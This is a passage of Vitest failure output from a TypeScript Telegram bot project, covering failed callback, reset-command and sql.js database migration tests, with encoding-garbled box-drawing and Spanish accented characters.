    264|       expect(ctx.answerCallbackQuery).toHaveBeenCalledWith('Ruta no peÃ”Ã‡Âª
       |                                       ^
    265|       expect(mockSessionManager.switchProject).not.toHaveBeenCalled();
    266|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[16/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Project Switch Callback > should reject non-accessible path
AssertionError: expected "spy" to be called with arguments: [ 'Ruta invâ”œÃ­lida' ]

Received: 

  1st spy call:

- Array [
-   "Ruta invâ”œÃ­lida",
- ]
+ Array []


Number of calls: 1

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:273:39
    271|       const ctx = await executeCallback('project_switch:inaccessible');
    272|       
    273|       expect(ctx.answerCallbackQuery).toHaveBeenCalledWith('Ruta invâ”œÃ­lÃ”Ã‡Âª
       |                                       ^
    274|       expect(mockSessionManager.switchProject).not.toHaveBeenCalled();
    275|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[17/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Project Switch Callback > should reject non-directory path
AssertionError: expected "spy" to be called with arguments: [ 'Ruta invâ”œÃ­lida' ]

Received: 

  1st spy call:

- Array [
-   "Ruta invâ”œÃ­lida",
- ]
+ Array []


Number of calls: 1

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:284:39
    282|       const ctx = await executeCallback('project_switch:file-path');
    283|       
    284|       expect(ctx.answerCallbackQuery).toHaveBeenCalledWith('Ruta invâ”œÃ­lÃ”Ã‡Âª
       |                                       ^
    285|       expect(mockSessionManager.switchProject).not.toHaveBeenCalled();
    286|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[18/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Project Switch Callback > should reject when session is busy
AssertionError: expected "spy" to be called with arguments: [ 'Operaciâ”œâ”‚n en curso' ]

Received: 

  1st spy call:

- Array [
-   "Operaciâ”œâ”‚n en curso",
- ]
+ Array []


Number of calls: 1

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:293:39
    291|       const ctx = await executeCallback('project_switch:some-project');
    292|       
    293|       expect(ctx.answerCallbackQuery).toHaveBeenCalledWith('Operaciâ”œâ”‚n Ã”Ã‡Âª
       |                                       ^
    294|       expect(mockSessionManager.switchProject).not.toHaveBeenCalled();
    295|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[19/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Project Switch Callback > should log errors and answer callback on switch failure
AssertionError: expected "spy" to be called with arguments: [ Ã”Ã‡Âª(2) ]

Received: 



Number of calls: 0

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:303:28
    301|       const ctx = await executeCallback('project_switch:error-project'Ã”Ã‡Âª
    302|       
    303|       expect(logger.error).toHaveBeenCalledWith('Failed to switch projÃ”Ã‡Âª
       |                            ^
    304|         telegramId: '123456',
    305|         projectName: 'error-project',

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[20/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Project Switch Callback > should always clear busy state in finally block
AssertionError: expected "spy" to be called with arguments: [ '123456', false ]

Received: 



Number of calls: 0

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:319:42
    317|       await executeCallback('project_switch:test-project');
    318|       
    319|       expect(mockSessionManager.setBusy).toHaveBeenCalledWith('123456'Ã”Ã‡Âª
       |                                          ^
    320|     });
    321| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[21/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Project Switch Callback > should handle stat error
AssertionError: expected "spy" to be called with arguments: [ 'Ruta invâ”œÃ­lida' ]

Received: 

  1st spy call:

- Array [
-   "Ruta invâ”œÃ­lida",
- ]
+ Array []


Number of calls: 1

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:327:39
    325|       const ctx = await executeCallback('project_switch:stat-error');
    326|       
    327|       expect(ctx.answerCallbackQuery).toHaveBeenCalledWith('Ruta invâ”œÃ­lÃ”Ã‡Âª
       |                                       ^
    328|       expect(mockSessionManager.switchProject).not.toHaveBeenCalled();
    329|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[22/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > MCP Toggle Callback > should enable MCP server successfully
Error: No handler found for callback: mcp_toggle:test-server:enable
 Ã”Ã˜Â» executeCallback tests/bot-callbacks.test.ts:138:11
    136|     }
    137| 
    138|     throw new Error(`No handler found for callback: ${callbackData}`);
       |           ^
    139|   };
    140| 
 Ã”Ã˜Â» tests/bot-callbacks.test.ts:334:25

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[23/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > MCP Toggle Callback > should disable MCP server successfully
Error: No handler found for callback: mcp_toggle:test-server:disable
 Ã”Ã˜Â» executeCallback tests/bot-callbacks.test.ts:138:11
    136|     }
    137| 
    138|     throw new Error(`No handler found for callback: ${callbackData}`);
       |           ^
    139|   };
    140| 
 Ã”Ã˜Â» tests/bot-callbacks.test.ts:350:25

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[24/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > MCP Toggle Callback > should handle non-existent MCP server
Error: No handler found for callback: mcp_toggle:nonexistent:enable
 Ã”Ã˜Â» executeCallback tests/bot-callbacks.test.ts:138:11
    136|     }
    137| 
    138|     throw new Error(`No handler found for callback: ${callbackData}`);
       |           ^
    139|   };
    140| 
 Ã”Ã˜Â» tests/bot-callbacks.test.ts:368:25

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[25/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > MCP Toggle Callback > should reject when session is busy
Error: No handler found for callback: mcp_toggle:some-server:enable
 Ã”Ã˜Â» executeCallback tests/bot-callbacks.test.ts:138:11
    136|     }
    137| 
    138|     throw new Error(`No handler found for callback: ${callbackData}`);
       |           ^
    139|   };
    140| 
 Ã”Ã˜Â» tests/bot-callbacks.test.ts:377:25

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[26/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > MCP Toggle Callback > should log errors and answer callback on toggle failure
Error: No handler found for callback: mcp_toggle:error-server:enable
 Ã”Ã˜Â» executeCallback tests/bot-callbacks.test.ts:138:11
    136|     }
    137| 
    138|     throw new Error(`No handler found for callback: ${callbackData}`);
       |           ^
    139|   };
    140| 
 Ã”Ã˜Â» tests/bot-callbacks.test.ts:387:25

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[27/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > MCP Toggle Callback > should always clear busy state in finally block
Error: No handler found for callback: mcp_toggle:test-server:disable
 Ã”Ã˜Â» executeCallback tests/bot-callbacks.test.ts:138:11
    136|     }
    137| 
    138|     throw new Error(`No handler found for callback: ${callbackData}`);
       |           ^
    139|   };
    140| 
 Ã”Ã˜Â» tests/bot-callbacks.test.ts:403:13

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[28/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Edge Cases and Error Handling > should handle missing from.id gracefully
AssertionError: expected "spy" to be called with arguments: [ '', undefined ]

Received: 



Number of calls: 0

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:413:41
    411|       const ctx = await executeCallback('model:claude-sonnet-4.5', { iÃ”Ã‡Âª
    412|       
    413|       expect(mockUserState.getOrCreate).toHaveBeenCalledWith('', undefÃ”Ã‡Âª
       |                                         ^
    414|     });
    415| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[29/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Edge Cases and Error Handling > should handle missing from.username gracefully
AssertionError: expected "spy" to be called with arguments: [ '999', undefined ]

Received: 



Number of calls: 0

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:419:41
    417|       const ctx = await executeCallback('model:claude-sonnet-4', { id:Ã”Ã‡Âª
    418|       
    419|       expect(mockUserState.getOrCreate).toHaveBeenCalledWith('999', unÃ”Ã‡Âª
       |                                         ^
    420|     });
    421| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[30/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Edge Cases and Error Handling > should handle empty callback match groups
AssertionError: expected "spy" to be called with arguments: [ 'Modelo invâ”œÃ­lido' ]

Received: 

  1st spy call:

- Array [
-   "Modelo invâ”œÃ­lido",
- ]
+ Array []


Number of calls: 1

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:434:39
    432|       await handler(ctx);
    433|       
    434|       expect(ctx.answerCallbackQuery).toHaveBeenCalledWith('Modelo invÃ”Ã‡Âª
       |                                       ^
    435|     });
    436| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[31/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > All Callbacks Registered > should register all expected callback patterns
AssertionError: expected [ Ã”Ã‡Âª(4) ] to include '^mcp_toggle:(.+?):(enable|disable)$'
 Ã”Ã˜Â» tests/bot-callbacks.test.ts:459:24
    457|       expect(patterns).toContain('^model:(.+)$');
    458|       expect(patterns).toContain('^project_switch:(.+)$');
    459|       expect(patterns).toContain('^mcp_toggle:(.+?):(enable|disable)$'Ã”Ã‡Âª
       |                        ^
    460|     });
    461|   });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[32/182]Ã”Ã„Â»

 FAIL  tests/commands-reset.test.ts > /reset command > should reset active session and clear busy state
 FAIL  tests/commands-reset.test.ts > /reset command > should respond when no active session exists
 FAIL  tests/commands-reset.test.ts > /reset command > should clear busy state even on error
 FAIL  tests/commands-reset.test.ts > /reset command > should log reset action with user ID and project path
Error: Failed to load url ../src/bot/commands (resolved id: ../src/bot/commands) in D:/Juanma/MCP Copilot Telegram/tests/commands-reset.test.ts. Does the file exist?
 Ã”Ã˜Â» loadAndTransform ../MCP%20Copilot%20Telegram/node_modules/vite/dist/node/chunks/dep-BK3b2jBa.js:51969:17

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[33/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should initialize in-memory database
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:12:45
     10|   it('should initialize in-memory database', async () => {
     11|     const { DatabaseManager } = await import('../src/state/database');
     12|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
     13|     expect(dbManager).toBeDefined();
     14|     expect(dbManager.db).toBeDefined();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[34/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should create database file on disk
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:28:45
     26|     }
     27| 
     28|     const dbManager = await DatabaseManager.create(testDbPath);
       |                                             ^
     29|     expect(dbManager).toBeDefined();
     30|     

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[35/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should create all required tables on migration
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:42:45
     40|   it('should create all required tables on migration', async () => {
     41|     const { DatabaseManager } = await import('../src/state/database');
     42|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
     43|     
     44|     // Verify tables exist by querying sqlite_master

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[36/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should execute INSERT and SELECT queries
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:56:45
     54|   it('should execute INSERT and SELECT queries', async () => {
     55|     const { DatabaseManager } = await import('../src/state/database');
     56|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
     57|     
     58|     // Insert a user

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[37/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should get single row with getFirst helper
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:75:45
     73|   it('should get single row with getFirst helper', async () => {
     74|     const { DatabaseManager } = await import('../src/state/database');
     75|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
     76|     
     77|     const now = new Date().toISOString();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[38/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should get all rows with getAll helper
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:92:45
     90|   it('should get all rows with getAll helper', async () => {
     91|     const { DatabaseManager } = await import('../src/state/database');
     92|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
     93|     
     94|     const now = new Date().toISOString();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[39/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should handle UPDATE queries
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:114:45
    112|   it('should handle UPDATE queries', async () => {
    113|     const { DatabaseManager } = await import('../src/state/database');
    114|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
    115|     
    116|     const now = new Date().toISOString();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[40/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should handle DELETE queries
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:134:45
    132|   it('should handle DELETE queries', async () => {
    133|     const { DatabaseManager } = await import('../src/state/database');
    134|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
    135|     
    136|     const now = new Date().toISOString();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[41/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should auto-save on modification when using file database
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:163:45
    161|     }
    162| 
    163|     const dbManager = await DatabaseManager.create(testDbPath);
       |                                             ^
    164|     
    165|     const now = new Date().toISOString();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[42/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should handle lastInsertRowid correctly
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:186:45
    184|   it('should handle lastInsertRowid correctly', async () => {
    185|     const { DatabaseManager } = await import('../src/state/database');
    186|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
    187|     
    188|     const now = new Date().toISOString();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[43/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should support UPSERT (INSERT OR REPLACE)
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:204:45
    202|   it('should support UPSERT (INSERT OR REPLACE)', async () => {
    203|     const { DatabaseManager } = await import('../src/state/database');
    204|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
    205|     
    206|     const now = new Date().toISOString();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[44/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should load existing database from file
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:240:46
    238| 
    239|     // Create and populate database
    240|     const dbManager1 = await DatabaseManager.create(testDbPath);
       |                                              ^
    241|     const now = new Date().toISOString();
    242|     dbManager1.run(

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[45/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should handle migration of allowed_paths_configured column
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:262:45
    260|   it('should handle migration of allowed_paths_configured column', asyÃ”Ã‡Âª
    261|     const { DatabaseManager } = await import('../src/state/database');
    262|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
    263|     
    264|     // Verify column exists

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[46/182]Ã”Ã„Â»

 FAIL  tests/database-sqljs-migration.test.ts > DatabaseManager - sql.js Migration > should support ON CONFLICT for mcp_servers upsert
TypeError: DatabaseManager.create is not a function
 Ã”Ã˜Â» tests/database-sqljs-migration.test.ts:272:45
